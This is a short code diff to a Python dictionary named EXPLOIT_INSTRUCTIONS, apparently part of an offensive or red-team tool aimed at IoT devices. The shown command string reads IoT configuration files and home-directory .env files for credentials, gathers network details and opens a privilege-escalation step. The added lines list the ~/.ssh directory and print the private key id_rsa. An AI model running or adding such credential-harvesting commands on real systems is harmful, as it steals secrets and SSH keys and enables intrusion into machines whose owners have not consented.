@@ -76,6 +76,8 @@ EXPLOIT_INSTRUCTIONS: dict[str, str] = {
         "echo === CREDENTIALS === && "
         "(cat /etc/iot/config.json 2>/dev/null || echo no-config) && "
         "(cat /home/*/.env 2>/dev/null || echo no-env) && "
+        "echo === SSH_KEYS === && "
+        "(ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || echo no-ssh-keys) && "
         "echo === NETWORK === && "
         "(ip addr show 2>/dev/null || ifconfig 2>/dev/null) && "
         "echo === PRIVESC === && "
